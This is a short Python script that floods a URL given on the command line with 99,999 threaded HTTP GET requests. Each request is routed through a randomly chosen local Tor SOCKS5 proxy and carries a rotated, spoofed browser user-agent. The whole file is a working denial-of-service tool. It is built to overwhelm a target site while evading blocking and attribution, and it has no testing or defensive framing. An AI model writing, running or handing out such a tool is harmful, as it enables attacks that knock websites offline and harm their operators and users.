import requests
import random
import threading

# User-agent list
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",
]

# List of SOCKS5 proxies
proxies_list = [
    'socks5h://localhost:9052',
    'socks5h://localhost:9053',  # Add more Tor instances running on different ports
    'socks5h://localhost:9054',
    'socks5h://localhost:9055',
    'socks5h://localhost:9056'
]

# Function to send HTTP GET request through Tor with proxy rotation
def send_http_request_via_tor(url):
    session = requests.Session()
    proxy = random.choice(proxies_list)  # Randomly select a proxy from the list
    session.proxies = {
        'http': proxy,
        'https': proxy
    }
    headers = {'User-Agent': random.choice(user_agents)}
    try:
        r = session.get(url, headers=headers, timeout=5)  # Send request without checking the response
        print(f"Request sent to {url} via {proxy} -> Status: {r.status_code}")
    except requests.RequestException as e:
        print(f"Request failed: {e}")
import sys
# Example usage
url = sys.argv[1]
number_of_requests = 99999
threads = []
for _ in range(number_of_requests):
    thread = threading.Thread(target=send_http_request_via_tor, args=(url,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()  # Ensure all threads complete
